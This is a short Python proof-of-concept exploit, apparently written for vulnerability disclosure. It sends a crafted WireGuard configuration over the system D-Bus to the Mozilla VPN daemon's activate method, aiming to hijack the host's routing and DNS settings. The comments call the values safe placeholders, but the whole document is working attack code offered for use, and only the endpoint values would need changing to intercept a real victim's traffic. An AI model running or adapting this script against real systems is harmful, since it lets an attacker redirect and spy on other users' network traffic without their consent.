import sys
import json
import pydbus

def exploit():
    try:
        bus = pydbus.SystemBus()
        vpn = bus.get("org.mozilla.vpn.dbus", "/")
    except Exception as e:
        print(f"[-] Failed to connect to DBus: {e}")
        return

    # Safe configuration for PoC
    # Routes only a specific test IP (192.0.2.1/32) to the tunnel.
    # Sets DNS to a safe public resolver (8.8.8.8) to demonstrate injection without breaking resolution.
    malicious_config = {
        "hopType": "SingleHop",
        "privateKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", # Valid base64 key format
        "deviceIpv4Address": "10.66.66.2/32",
        "deviceIpv6Address": "fc00:bbbb:bbbb:bb01::2/128",
        "serverIpv4Gateway": "10.66.66.1",
        "serverIpv6Gateway": "fc00:bbbb:bbbb:bb01::1",
        "serverIpv4AddrIn": "192.168.1.100", # Attacker's public IP (dummy)
        "serverIpv6AddrIn": "::1",
        "serverPublicKey": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
        "serverPort": 51820,
        "dnsServer": "8.8.8.8", # Google DNS (Safe to inject)
        "allowedIPAddressRanges": [
            {"address": "192.0.2.1", "range": 32, "isIpv6": False} # TEST-NET-1, safe to route
        ]
    }

    print("[*] Sending malicious configuration to Mozilla VPN Daemon...")
    try:
        # The activate method takes a JSON string
        vpn.activate(json.dumps(malicious_config))
        print("[+] Exploit sent successfully!")
        print("[+] Check 'ip route' for 192.0.2.1/32 and '/etc/resolv.conf' (or resolvectl status) for 8.8.8.8 to verify hijacking.")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    exploit()
